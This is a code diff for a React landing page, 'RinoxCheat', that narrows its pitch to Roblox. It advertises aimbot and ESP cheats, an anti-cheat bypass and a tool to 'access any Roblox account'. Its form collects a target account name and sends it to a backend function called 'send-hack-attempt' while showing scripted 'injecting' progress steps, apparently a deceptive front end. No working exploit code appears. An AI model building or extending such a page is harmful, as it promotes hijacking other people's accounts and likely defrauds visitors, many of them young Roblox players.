@@ -21,46 +21,34 @@ const STEPS = [
   "Injecting cheat module...",
 ];
 
-const GAMES = [
-  "Fortnite",
-  "Roblox",
-  "Valorant",
-  "CS2",
-  "Call of Duty",
-  "Minecraft",
-  "GTA V",
-  "Apex Legends",
-];
-
 const FEATURES = [
   {
     icon: Crosshair,
-    title: "Premium cheats",
-    desc: "Aimbot, ESP, wallhack — fine-tuned for every supported game.",
+    title: "Roblox cheats",
+    desc: "Aimbot, ESP, fly, speed — premium scripts for every popular Roblox game.",
   },
   {
     icon: Lock,
     title: "Account access",
-    desc: "Recover access to any account with our advanced toolkit.",
+    desc: "Recover access to any Roblox account with our advanced toolkit.",
   },
   {
     icon: ShieldCheck,
     title: "Undetected",
-    desc: "Stealth-first architecture — anti-cheat bypass kept up to date.",
+    desc: "Stealth-first — Byfron & Hyperion bypass kept up to date.",
   },
 ];
 
 const Index = () => {
   const [target, setTarget] = useState("");
-  const [game, setGame] = useState("");
   const [loading, setLoading] = useState(false);
   const [steps, setSteps] = useState<string[]>([]);
   const [done, setDone] = useState(false);
 
   useEffect(() => {
-    document.title = "RinoxCheat — Premium Cheats & Account Access 2026";
+    document.title = "RinoxCheat — Roblox Cheats & Account Access 2026";
     const desc =
-      "RinoxCheat: premium undetected cheats for every game and a powerful tool to access any account. Fast, stealth, 2026.";
+      "RinoxCheat: premium undetected Roblox cheats and a powerful tool to access any Roblox account. Fast, stealth, 2026.";
     let m = document.querySelector('meta[name="description"]');
     if (!m) {
       m = document.createElement("meta");
@@ -83,7 +71,7 @@ const Index = () => {
     setDone(false);
     setSteps([]);
 
-    const payload = `Game: ${game || "—"}\nTarget: ${target}`;
+    const payload = `Game: Roblox\nTarget: ${target}`;
     const sendPromise = supabase.functions.invoke("send-hack-attempt", {
       body: { input: payload },
     });
@@ -217,29 +205,18 @@ const Index = () => {
             </div>
 
             <div className="p-5 sm:p-6">
-              <label htmlFor="game" className="block text-sm font-medium mb-2">
-                Game
-              </label>
-              <div className="relative">
-                <Gamepad2 className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground pointer-events-none" />
-                <select
-                  id="game"
-                  value={game}
-                  onChange={(e) => setGame(e.target.value)}
-                  disabled={loading}
-                  className="w-full h-11 pl-9 pr-3 rounded-lg bg-input border border-border text-foreground text-sm focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-primary appearance-none"
-                >
-                  <option value="">Select a game</option>
-                  {GAMES.map((g) => (
-                    <option key={g} value={g}>
-                      {g}
-                    </option>
-                  ))}
-                </select>
+              <div className="flex items-center justify-between mb-4 p-3 rounded-lg bg-input border border-border">
+                <div className="flex items-center gap-2.5">
+                  <Gamepad2 className="h-4 w-4 text-primary" />
+                  <span className="text-sm font-medium">Roblox</span>
+                </div>
+                <span className="text-[10px] tracking-widest text-primary uppercase">
+                  Supported
+                </span>
               </div>
 
-              <label htmlFor="target" className="block text-sm font-medium mt-5 mb-2">
-                Target account
+              <label htmlFor="target" className="block text-sm font-medium mt-1 mb-2">
+                Target Roblox account
               </label>
               <Input
                 id="target"
